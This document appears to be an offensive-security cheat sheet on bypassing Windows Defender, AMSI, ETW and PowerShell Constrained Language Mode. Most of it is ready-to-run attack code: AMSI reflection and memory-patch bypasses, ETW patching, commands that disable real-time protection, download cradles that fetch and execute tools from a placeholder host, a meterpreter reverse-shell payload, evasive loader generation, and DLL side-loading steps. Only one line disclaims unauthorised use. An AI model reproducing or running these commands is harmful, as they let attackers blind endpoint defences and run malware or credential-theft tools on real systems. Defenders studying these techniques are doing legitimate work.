AV / AMSI Bypass - Cheat Sheet

Defeat Windows Defender (or other AV/EDR) and AMSI so your offensive tools
actually run. AMSI blocks PowerShell/JScript/.NET at the scripting layer; AV
blocks malicious files on disk. Both must be handled or your payloads die on
arrival. Replace <placeholders> with your own values.

>>> Only use on systems you own or are authorized to test. <<<


AMSI (Anti-Malware Scan Interface) Bypass

AMSI lets Defender inspect PowerShell, VBScript, JScript and .NET assemblies
before they execute. Bypass it first or your PS tooling (Rubeus, SharpHound,
PowerView…) gets caught even if loaded in memory.

Check if AMSI is active:

    # this should be flagged - if it isn't, AMSI is already off
    "Invoke-Mimikatz"

Classic one-liner (force amsiInitFailed = true via reflection):

    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

If the above is signatured, obfuscate the strings:

    $a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
    $f=$a.GetField('am'+'siIni'+'tFailed','NonPublic,Static')
    $f.SetValue($null,$true)

Variable-name randomisation pattern:

    $w = 'System.Management.Automation.A]msiUtils' -replace ']',''
    $c = [Ref].Assembly.GetType($w)
    $c.GetField(('a]msiIn]itFai]led' -replace ']',''),'NonPublic,Static').SetValue($null,$true)

Matt Graeber reflection (memory-patch amsi.dll):

    $Win32 = @"
    using System;using System.Runtime.InteropServices;
    public class Win32{
    [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
    [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);
    }
    "@
    Add-Type $Win32
    $addr=[Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"),"AmsiScanBuffer")
    $p=0;[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)
    [Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$addr,6)

PowerShell downgrade (v2 has no AMSI — if .NET 2.0 is installed):

    powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/tool.ps1')"


ETW (Event Tracing for Windows) Patching

ETW feeds .NET runtime events to Defender — patch it alongside AMSI for
assemblies loaded via Assembly.Load (Rubeus, Seatbelt…):

    $etw=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')
    # then for each provider: set m_enabled = 0

Quick one-liner (patch EtwEventWrite in ntdll):

    $ntdll=[Win32]::GetProcAddress([Win32]::LoadLibrary("ntdll.dll"),"EtwEventWrite")
    $p=0;[Win32]::VirtualProtect($ntdll,[uint32]1,0x40,[ref]$p)
    [Runtime.InteropServices.Marshal]::WriteByte($ntdll,0xC3)


Defender Enumeration (before deciding what to bypass)

    # check Defender status
    Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,BehaviorMonitorEnabled

    # list exclusions — gold mine (drop your payload in an excluded path)
    Get-MpPreference | Select ExclusionPath,ExclusionExtension,ExclusionProcess

    # check if tamper protection is on (can't disable Defender programmatically if so)
    Get-MpComputerStatus | Select IsTamperProtected

    # disable real-time protection (requires local admin + tamper protection OFF)
    Set-MpPreference -DisableRealtimeMonitoring $true


On-Disk Evasion (getting a file past AV)

Defender scans files at rest, so anything you drop to disk gets inspected.
Strategies to get a payload past static + heuristic analysis.

Obfuscation (PowerShell):

    # Invoke-Obfuscation (Daniel Bohannon)
    Import-Module Invoke-Obfuscation
    Invoke-Obfuscation -ScriptPath tool.ps1 -Command 'TOKEN\ALL\1'

    # manual: base64 + IEX
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
    powershell -enc $enc

Payload generation with evasion (msfvenom is mostly dead for AV bypass):

    # ScareCrow — EDR-evasion loader (side-loading, ETW/AMSI patch baked in)
    ScareCrow -I payload.bin -Loader dll -domain <legit-domain.com>

    # Nim/Rust loaders — compile your own (custom = unsignatured)
    # NimSyscallPacker, OffensiveNim, RustSyscalls — all on GitHub

    # donut — convert .NET exe/dll to position-independent shellcode
    donut -i Rubeus.exe -o rubeus.bin
    # then inject rubeus.bin with a custom loader

    # msfvenom (as a starting point — then wrap in a custom loader)
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o payload.bin

DLL side-loading / proxy (Living off the Land):

    1. Find a signed Microsoft EXE that loads a DLL by name (not full path)
    2. Place your malicious DLL with that name next to the EXE
    3. Run the signed EXE — it loads your DLL, Defender trusts the parent
    # common: OneDriveStandaloneUpdater.exe → version.dll
    # tools: hijacklibs.net, SigFlip


In-Memory Execution (avoid touching disk)

    # cradle — download + execute in memory (never written to disk)
    IEX(New-Object Net.WebClient).DownloadString('http://<ip>/tool.ps1')

    # .NET Assembly.Load from byte array
    $bytes = (New-Object Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')
    [Reflection.Assembly]::Load($bytes)
    [Rubeus.Program]::Main("kerberoast".Split())

    # PowerShell reflection to load C# in memory
    Add-Type -TypeDefinition $csharpCode

    # Cobalt Strike / Sliver — BOFs (Beacon Object Files) run in memory


CLM (Constrained Language Mode) Bypass

If PowerShell is locked to ConstrainedLanguage, most offensive commands fail:

    $ExecutionContext.SessionState.LanguageMode    # check current mode

    # bypass via InstallUtil (LOLBIN — runs .NET with FullLanguage)
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

    # bypass via MSBuild
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

    # bypass via PowerShell runspace in C# (compile + run as .exe)


Putting It Together (typical order on an engagement)

    1. Check Defender status + exclusions
    2. Bypass AMSI (one-liner or memory patch)
    3. Patch ETW (if loading .NET assemblies)
    4. Run tools in memory (IEX cradle or Assembly.Load)
    5. For persistent access: use ScareCrow or custom loader to generate
       an on-disk payload that survives reboots


Defender Notes (for the report)
  - Tamper Protection ON prevents programmatic disabling of Defender.
  - ASR rules block Office child processes, PSExec, WMI, credential theft.
  - Credential Guard isolates LSASS — no more direct dumping.
  - EDR (CrowdStrike, S1, MDE) adds kernel-level hooking beyond AMSI/AV.
  - Hardened + monitored environments may detect AMSI patches via ETW or
    the AMSI provider itself (defence in depth).


Key idea: AMSI is the first gate — it inspects scripts and assemblies before
execution. Bypass it (reflection or memory patch) and your PowerShell tools
run freely. AV/Defender is the second gate — it scans files on disk. Avoid
disk entirely (in-memory cradles, Assembly.Load) or use custom loaders
(ScareCrow, Nim/Rust) that aren't signatured. Check exclusions first — if
Defender already ignores a path, just drop your payload there.
